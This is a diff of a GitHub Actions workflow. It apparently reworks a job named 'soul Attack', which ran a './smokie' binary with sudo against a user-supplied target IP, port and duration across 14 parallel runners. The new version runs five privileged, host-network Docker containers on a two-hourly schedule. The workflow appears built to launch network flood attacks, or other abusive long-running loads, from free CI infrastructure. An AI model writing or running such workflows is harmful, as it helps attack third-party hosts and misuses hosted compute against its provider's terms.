@@ -1,24 +1,44 @@
-name: soul Attack
+name: soulcracks owner
+
 on:
+  push:
+    branches: [ "main" ]
+  schedule:
+    - cron: "0 */2 * * *"
+
   workflow_dispatch:
-    inputs:
-      ip:
-        description: 'Target IP'
-        required: true
-      port:
-        description: 'Target Port'
-        required: true
-      time:
-        description: 'Attack Duration'
-        required: true
 
 jobs:
-  soul:
+  run-soul-matrix:
     runs-on: ubuntu-latest
+    timeout-minutes: 130
     strategy:
+
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14]
+        job_number: [1, 2, 3, 4, 5]
+
+      fail-fast: false
+
     steps:
-    - uses: actions/checkout@v3
-    - run: chmod +x *
-    - run: sudo ./smokie ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 4 4
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Build Docker Image
+        run: |
+          docker build -t soul-app:latest .
+
+      - name: Run Job ${{ matrix.job_number }} for 2 Hours
+        run: |
+          echo "Starting Parallel Job #${{ matrix.job_number }}..."
+          
+
+          docker run -d --privileged --network host --name soul_container_${{ matrix.job_number }} soul-app:latest
+          
+
+          timeout 7100s docker logs -f soul_container_${{ matrix.job_number }} || echo "Job completed."
+
+      - name: Cleanup
+        if: always()
+        run: |
+          docker stop soul_container_${{ matrix.job_number }} || true
+          docker rm soul_container_${{ matrix.job_number }} || true
